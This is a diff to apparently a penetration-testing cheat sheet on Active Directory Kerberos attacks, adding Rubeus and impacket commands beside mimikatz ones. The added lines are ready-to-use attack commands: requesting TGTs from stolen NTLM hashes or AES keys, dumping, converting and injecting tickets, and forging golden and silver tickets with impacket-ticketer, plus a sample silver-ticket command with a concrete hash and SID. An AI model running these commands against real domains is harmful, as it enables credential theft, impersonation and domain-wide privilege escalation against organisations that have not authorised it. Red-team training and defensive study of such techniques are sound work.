@@ -18,7 +18,9 @@ Overpass the hash, presented in the [blackhat](https://www.blackhat.com/docs/us-
 We can for example use overpass the hash through [mimikatz](https://github.com/gentilkiwi/mimikatz):
 
 ```
-mimikatz # sekurlsa::pth /user:user1 /domain:contoso.com /ntlm:<ntlm_hash> /run:PowerShell.exe
+1. C:\> .\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt
+
+2. mimikatz # sekurlsa::pth /user:user1 /domain:contoso.com /ntlm:<ntlm_hash> /run:PowerShell.exe
 ```
 
 Once we have the new powershell session, we can authenticate to any AD resource to obtain a TGT, here's an example:
@@ -31,24 +33,38 @@ PS C:\> net use \\dc01.contoso.com
 PS C:\> klist -> TGT for the user1
 ```
 
+Alternatively, you can use this tools from Linux to get a TGT in a .ccache file:
+
+```
+~# impacket-getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
+
+~# impacket-getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
+
+~# impacket-python getTGT.py <domain_name>/<user_name>:[password]
+```
+
 **PASS THE TICKET:**
 
 The pass-the-ticket technique abuses the TGS, which can be exported and injected somewhere else.
 
 ```
-Listing tickets with mimikatz:
+Listing tickets:
 
 mimikatz # kerberos::list
 
+C:\> .\Rubeus.exe dump
 
-Exporting all tickets(TGTs and TGSs) with mimikatz:
+Exporting all tickets(TGTs and TGSs):
 
 mimikatz # sekurlsa::tickets /export   
 
+C:\> [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<bas64_ticket>")) -> from base64 to .kirbi
 
-Injecting some ticket into memory with mimikatz:
+Injecting some ticket into memory:
 
 mimikatz # kerberos::ptt 'C:\ticket.kirbi'
+
+C:\> .\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
 ```
 
 *When trying to export a usable TGT for our current user, this requieres elevation in the system*
@@ -86,6 +102,13 @@ mimikatz # kerberos::golden /user:trike /domain:contoso.com /sid:<our_sid_withou
 mimikatz # misc::cmd -> launcing a new cmd with our new TGT
 ```
 
+As an alternative we can create golden tickets from Linux using [impacket-ticketer](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
+
+```
+~# impacket-ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
+
+~# impacket-ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
+```
 **SILVER TICKETS:**
 
 This technique consists of crafting a TGS with the password hash of the SPN. The interesting part about this TGS, is that we can modify our permissions(such as user id or group id) stating that we are local administrator/domain admin/etc on the server where the SPN we have compromised is running its service. 
@@ -101,6 +124,14 @@ mimikatz # kerberos::list
 mimikatz # kerberos::golden /user:trike /domain:contoso.com /sid:S-1-5-21-2602875597-2787548311-2599479668 /target:server.contoso.com /service:MSSQL /rc4:1BF1DE6AEDB12AE1E548210EDBF3511E /ptt
 ```
 (note that in the sid parameter we didn't specify the RID of the trike user, since mimikatz will automatically set our RID to 500 which equals to both local administrator and domain admin)
+
+Alternatively we can use impacket-ticketer from Linux to create silver tickets:
+
+```
+~# impacket-ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
+
+~# impacket-ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
+```
 
 **DOMAIN CONTROLLER SYNCHRONIZATION:**
 
